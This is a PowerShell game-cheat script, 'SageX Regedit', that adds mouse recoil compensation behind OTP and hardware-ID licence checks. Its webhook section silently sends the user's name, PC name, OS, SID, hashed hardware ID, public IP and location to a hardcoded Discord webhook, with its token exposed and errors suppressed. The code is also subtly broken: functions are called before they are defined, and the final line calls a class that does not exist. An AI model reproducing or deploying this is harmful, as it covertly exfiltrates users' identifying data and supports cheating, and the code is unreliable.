Clear-Host

# ==================== OTP VERIFICATION SYSTEM ====================
function Get-MachineFingerprint {
    # Create a unique fingerprint using multiple system identifiers
    $cpuId = (Get-WmiObject Win32_Processor).ProcessorId
    $biosId = (Get-WmiObject Win32_BIOS).SerialNumber
    $diskId = (Get-WmiObject Win32_DiskDrive).SerialNumber
    $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }).MacAddress | Select-Object -First 1
    
    $combinedId = "$cpuId$biosId$diskId$macAddress"
    $hashedId = [System.BitConverter]::ToString(
        [System.Security.Cryptography.SHA256]::Create().ComputeHash(
            [System.Text.Encoding]::UTF8.GetBytes($combinedId)
        )
    ) -replace "-", ""
    
    return $hashedId.Substring(0, 32)  # Return first 32 chars of hash
}

function Generate-SecureOTP {
    param([int]$Length = 12)
    
    # Create a cryptographically secure OTP
    $validChars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"  # Exclude easily confused chars
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $bytes = New-Object byte[]($Length)
    $rng.GetBytes($bytes)
    
    $otp = -join ($bytes | ForEach-Object {
        $validChars[$_ % $validChars.Length]
    })
    
    return $otp
}

function Verify-OTP {
    param(
        [string]$MachineFingerprint,
        [string]$OTP,
        [string]$DatabaseURL
    )
    
    try {
        # Fetch remote database with retry logic
        $maxRetries = 3
        $retryCount = 0
        $remoteData = $null
        
        do {
            try {
                $remoteData = Invoke-RestMethod -Uri $DatabaseURL -UseBasicParsing -ErrorAction Stop -ContentType "text/plain; charset=utf-8"
                break
            }
            catch {
                $retryCount++
                if ($retryCount -ge $maxRetries) {
                    throw "Failed to fetch OTP database after $maxRetries attempts: $_"
                }
                Start-Sleep -Seconds 5
            }
        } while ($true)

        if ([string]::IsNullOrEmpty($remoteData)) {
            Write-Host "[!] Empty OTP database received" -ForegroundColor Red
            return $false
        }
        
        # Check for matching entry (format: fingerprint:otp:timestamp)
        $pattern = "$MachineFingerprint`:$OTP`:\d{4}-\d{2}-\d{2}"
        if ($remoteData -match $pattern) {
            return $true
        }
        
        return $false
    }
    catch {
        Write-Host "[!] Failed to verify OTP: $_" -ForegroundColor Red
        return $false
    }
}

function Initialize-OTPSystem {
    # Create SageX Regedit folder in AppData if it doesn't exist
    $appDataFolder = "$env:APPDATA\SageX Regedit"
    if (-not (Test-Path $appDataFolder)) {
        try {
            New-Item -ItemType Directory -Path $appDataFolder -Force | Out-Null
        }
        catch {
            Write-Host "[!] Failed to create SageX Regedit folder: $_" -ForegroundColor Red
            exit
        }
    }
    
    $LocalStoragePath = "$appDataFolder\otp.ini"
    $RemoteDatabaseURL = "https://raw.githubusercontent.com/Toxic-Speed/SAG--X/main/otp_db.txt"
    $machineFingerprint = Get-MachineFingerprint
    
    # Check if OTP already exists locally
    if (Test-Path $LocalStoragePath) {
        try {
            $localOTP = Get-Content $LocalStoragePath | Where-Object { $_ -match '^otp=' } | ForEach-Object { ($_ -split '=')[1] }
            
            if ([string]::IsNullOrEmpty($localOTP)) {
                throw "No OTP found in local storage"
            }
            
            # Verify against remote database
            $isVerified = Verify-OTP -MachineFingerprint $machineFingerprint -OTP $localOTP -DatabaseURL $RemoteDatabaseURL
            
            if (-not $isVerified) {
                Write-Host "`n[!] Device not authorized. Please contact support." -ForegroundColor Red
                Write-Host "[!] Fingerprint: $machineFingerprint" -ForegroundColor Yellow
                Write-Host "[!] OTP: $localOTP" -ForegroundColor Cyan
                Start-Sleep 15
                exit
            }
            
            Write-Host "`n[+] Device verified successfully!" -ForegroundColor Green
            return $true
        }
        catch {
            Write-Host "[!] Error reading local OTP: $_" -ForegroundColor Red
            exit
        }
    }
    else {
        # First-time setup - generate and store OTP
        $newOTP = Generate-SecureOTP -Length 12
        $otpContent = @(
            "[OTP]",
            "fingerprint=$machineFingerprint",
            "otp=$newOTP",
            "generated=$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        )
        
        try {
            $otpContent | Out-File -FilePath $LocalStoragePath -Force -Encoding UTF8
            Write-Host "`n[!] FIRST-TIME SETUP REQUIRED" -ForegroundColor Yellow
            Write-Host "=============================================" -ForegroundColor Cyan
            Write-Host "[!] Please register this device with the following information:" -ForegroundColor Cyan
            Write-Host "`n[!] Fingerprint: $machineFingerprint" -ForegroundColor Yellow
            Write-Host "[!] OTP: $newOTP" -ForegroundColor Green
            Write-Host "`n[!] Send this information to the developer :" -ForegroundColor Cyan
            Write-Host "`n[*] Exiting until device is authorized..." -ForegroundColor Red
            Start-Sleep 10
            exit
        }
        catch {
            Write-Host "[!] Failed to create OTP file: $_" -ForegroundColor Red
            exit
        }
    }
}

# ==================== MAIN SCRIPT ====================

# Run OTP verification first
Initialize-OTPSystem

cls

# ASCII Art with colors
$colors = @("Red", "Yellow", "Cyan", "Green", "Magenta", "Blue", "White")

$asciiArt = @'
  _________                     ____  ___ __________                         .___.__  __   
 /   _____/____     ____   ____ \   \/  / \______   \ ____   ____   ____   __| _/|__|/  |_ 
 \_____  \\__  \   / ___\_/ __ \ \     /   |       _// __ \ / ___\_/ __ \ / __ | |  \   __\
 /        \/ __ \_/ /_/  >  ___/ /     \   |    |   \  ___// /_/  >  ___// /_/ | |  ||  |  
/_______  (____  /\___  / \___  >___/\  \  |____|_  /\___  >___  / \___  >____ | |__||__|  
        \/     \//_____/      \/      \_/         \/     \/_____/      \/     \/             
'@

$asciiArt -split "`n" | ForEach-Object {
    $color = Get-Random -InputObject $colors
    Write-Host $_ -ForegroundColor $color
}

# Get SID
try {
    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Write-Host "`n[*] Your SID: $sid" -ForegroundColor Yellow
} catch {
    Write-Host "[!] Failed to get SID" -ForegroundColor Red
    exit
}

# ==================== WEBHOOK BLOCK ====================
$webhookUrl = "https://discord.com/api/webhooks/1375353706232414238/dMBMuwq29UaqujrlC1YPhh9-ygK-pX2mY5S7VHb4-WUrxWMPBB8YPVszTfubk-eVLrgN"

$user = $env:USERNAME
$pcName = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
$hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""

try {
    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json" -ErrorAction Stop
    $ip = $ipInfo.query
    $country = $ipInfo.country
    $region = $ipInfo.regionName
    $city = $ipInfo.city
} catch {
    $ip = "Unavailable"
    $country = "Unavailable"
    $region = "Unavailable"
    $city = "Unavailable"
}

$embed = @{
    title = "<:Dead:1346705076626002033> SageX Executed"
    color = 16711680
    timestamp = (Get-Date).ToString("o")
    fields = @(
        @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
        @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
        @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
        @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
        @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
        @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
        @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
        @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false }
    )
}

$payload = @{
    username = "SageX Logger"
    embeds = @($embed)
} | ConvertTo-Json -Depth 10

try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
} catch {
}

# ==================== HWID VERIFICATION ====================
$authURL = "https://raw.githubusercontent.com/Toxic-Speed/SAGE-X/main/HWID"

try {
    $rawData = Invoke-RestMethod -Uri $authURL -UseBasicParsing -ErrorAction Stop
    if ([string]::IsNullOrEmpty($rawData)) {
        throw "Empty HWID database received"
    }
} catch {
    Write-Host "`n[!] Failed to fetch authorized SIDs from server: $_" -ForegroundColor Red
    exit
}

# Check if SID is authorized
if ($rawData -notmatch $sid) {
    Write-Host "`n[!] Unauthorized access detected!" -ForegroundColor Red
    Write-Host "[!] Your SID was not found in the authorized database" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    exit
}

# ==================== MAIN FUNCTIONALITY ====================
$msgLines = @(
    "[+] Precision Drag Assist System Initialized",
    "[+] AI-Powered Mouse Movement Optimization",
    "[+] Dynamic Sensitivity Adjustment Available",
    "[+] Vertical Recoil Compensation Active",
    "[+] Hold LMB to Activate Assist Mode",
    "[+] Press F7 to Toggle System ON/OFF"
)

$msgLines | ForEach-Object {
    Write-Host $_ -ForegroundColor Cyan
    Start-Sleep -Milliseconds 200
}

Write-Host "`n----------------------------------------------------------------------------------"

try {
    # Start the enhanced drag assist
    Start-DragAssist
    
    # Keep console open and running
    while ($true) {
        Start-Sleep -Seconds 1
        # You can add periodic status checks here if needed
    }
}
finally {
    # Clean up on exit
    Stop-DragAssist
    Write-Host "`n[!] Drag Assist System Shutdown Complete" -ForegroundColor Red
}

# ==================== ENHANCED DRAG ASSIST SYSTEM ====================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class EnhancedDragAssist
{
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);
    
    [DllImport("user32.dll")]
    public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
    
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    
    [DllImport("kernel32.dll")]
    public static extern bool Beep(int freq, int duration);
    
    [DllImport("user32.dll")]
    public static extern IntPtr GetConsoleWindow();
    
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    public const int MOUSEEVENTF_MOVE = 0x0001;
    public const int VK_LBUTTON = 0x01;
    public const int VK_F7 = 0x76;
    public const int SW_MINIMIZE = 6;
    
    [StructLayout(LayoutKind.Sequential)]
    public struct POINT {
        public int X;
        public int Y;
    }
    
    public static bool IsEnabled = true;
    public static bool IsRunning = true;
    public static double Sensitivity = 0.4;  // 0.1 to 1.0
    public static int Compensation = 4;      // pixels
    public static int ActivationDelay = 60;   // ms
    
    public static void RunAssist()
    {
        // Minimize console window on start
        var consoleHandle = GetConsoleWindow();
        ShowWindow(consoleHandle, SW_MINIMIZE);
        
        POINT prevPos;
        GetCursorPos(out prevPos);
        bool isHolding = false;
        DateTime holdStart = DateTime.MinValue;
        bool toggleDebounce = false;
        
        while (IsRunning)
        {
            try 
            {
                Thread.Sleep(5);
                
                // Toggle with F7
                bool f7Pressed = (GetAsyncKeyState(VK_F7) & 0x8000) != 0;
                if (f7Pressed && !toggleDebounce)
                {
                    IsEnabled = !IsEnabled;
                    ConsoleBeep(IsEnabled ? 800 : 400, 100);
                    UpdateConsoleTitle();
                    toggleDebounce = true;
                    Thread.Sleep(300); // Debounce
                }
                else if (!f7Pressed)
                {
                    toggleDebounce = false;
                }
                
                if (!IsEnabled) continue;
                
                bool lmbDown = (GetAsyncKeyState(VK_LBUTTON) & 0x8000) != 0;
                
                if (lmbDown)
                {
                    if (!isHolding)
                    {
                        // New hold started
                        isHolding = true;
                        holdStart = DateTime.Now;
                        GetCursorPos(out prevPos); // Reset position tracking
                    }
                    else if ((DateTime.Now - holdStart).TotalMilliseconds >= ActivationDelay)
                    {
                        POINT currentPos;
                        GetCursorPos(out currentPos);
                        
                        int deltaY = currentPos.Y - prevPos.Y;
                        int deltaX = currentPos.X - prevPos.X;
                        
                        // Only compensate when dragging upward
                        if (deltaY < -1) 
                        {
                            int adjustedX = (int)(deltaX * Sensitivity);
                            mouse_event(MOUSEEVENTF_MOVE, -adjustedX, -Compensation, 0, 0);
                        }
                        
                        prevPos = currentPos;
                    }
                }
                else
                {
                    isHolding = false;
                }
            }
            catch 
            {
                Thread.Sleep(100);
            }
        }
    }
    
    public static void ConsoleBeep(int freq, int duration)
    {
        try { Beep(freq, duration); } catch { }
    }
    
    public static void UpdateConsoleTitle()
    {
        try 
        {
            Console.Title = $"SageX Regedit | Drag Assist: {(IsEnabled ? "ON" : "OFF")} | Sens: {Sensitivity*100}%";
        } 
        catch { }
    }
}
"@

# ==================== DRAG ASSIST CONTROL FUNCTIONS ====================
function Start-DragAssist {
    # Create and start the drag assist thread
    $script:DragAssistThread = [System.Threading.Thread]::new(
        [System.Threading.ThreadStart]{
            [EnhancedDragAssist]::RunAssist()
        }
    )
    $script:DragAssistThread.IsBackground = $true
    $script:DragAssistThread.Start()
    
    # Initialize settings
    [EnhancedDragAssist]::IsRunning = $true
    [EnhancedDragAssist]::UpdateConsoleTitle()
    
    Write-Host "`n[DRAG ASSIST CONTROL]" -ForegroundColor Cyan
    Write-Host "----------------------------" -ForegroundColor DarkCyan
    Write-Host "Status:   $([EnhancedDragAssist]::IsEnabled)" -ForegroundColor Yellow
    Write-Host "Sensitivity: $([math]::Round([EnhancedDragAssist]::Sensitivity * 100))%" -ForegroundColor Green
    Write-Host "Compensation: $([EnhancedDragAssist]::Compensation) pixels" -ForegroundColor Green
    Write-Host "`n[CONTROLS]" -ForegroundColor Cyan
    Write-Host "----------------------------" -ForegroundColor DarkCyan
    Write-Host "F7:       Toggle ON/OFF" -ForegroundColor White
    Write-Host "LMB Hold: Activate Assist" -ForegroundColor White
}

function Stop-DragAssist {
    [EnhancedDragAssist]::IsRunning = $false
    if ($script:DragAssistThread -and $script:DragAssistThread.IsAlive) {
        $script:DragAssistThread.Join(1000)
    }
}

function Set-DragAssistSensitivity {
    param(
        [Parameter(Mandatory=$true)]
        [ValidateRange(10,100)]
        [int]$Percentage
    )
    [EnhancedDragAssist]::Sensitivity = $Percentage / 100.0
    [EnhancedDragAssist]::UpdateConsoleTitle()
    Write-Host "Sensitivity set to $Percentage%" -ForegroundColor Green
}

function Set-DragAssistCompensation {
    param(
        [Parameter(Mandatory=$true)]
        [ValidateRange(1,10)]
        [int]$Pixels
    )
    [EnhancedDragAssist]::Compensation = $Pixels
    Write-Host "Vertical compensation set to $Pixels pixels" -ForegroundColor Green
}

[FairXDragAssist]::Run()
